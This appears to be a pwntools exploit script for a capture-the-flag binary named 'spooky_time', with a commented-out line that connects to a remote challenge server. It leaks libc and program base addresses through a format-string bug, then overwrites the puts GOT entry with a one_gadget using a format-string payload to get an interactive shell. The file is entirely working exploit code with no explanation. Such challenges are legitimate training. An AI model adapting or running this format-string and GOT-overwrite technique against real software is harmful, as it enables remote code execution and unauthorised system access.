from pwn import *
#context.log_level = 'error'
context.arch = "amd64"

elf = ELF("./spooky_time")
put = elf.got['puts']
libc = ELF("./glibc/libc.so.6")
rop = ROP(libc)
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])
STR_binsh = next(libc.search(b'/bin/sh'))
print(hex(STR_binsh))
libc_start_main_offset = libc.symbols["__libc_start_main"]
system_offet = libc.symbols["system"]
print(hex(libc_start_main_offset))
#for i in range(100):
p = process("spooky_time")
input()
#p = remote("206.189.28.99",30890)
p.recv()
#p.sendline("%"+str(i)+"$p")
p.sendline("%49$p%51$p")
p.recvuntil(b"than \n")
leak = p.recvuntil(b"\n")[:-1]
l1 = leak[:-14]
l2 = leak[14:]
libc_leak = int(l1, 16) - 0x29D90
base_leak = int(l2, 16) - 0x13C0
print(hex(libc_leak))
print(hex(base_leak))

elf.address = base_leak
PUTS_GOT = elf.got['puts']
one_gadget = libc_leak + 0xebcf1
payload = fmtstr_payload(8, { PUTS_GOT: one_gadget })
print(p.recvuntil(b"time..\n"))
p.sendline(payload)
p.interactive()
exit()
p.close()
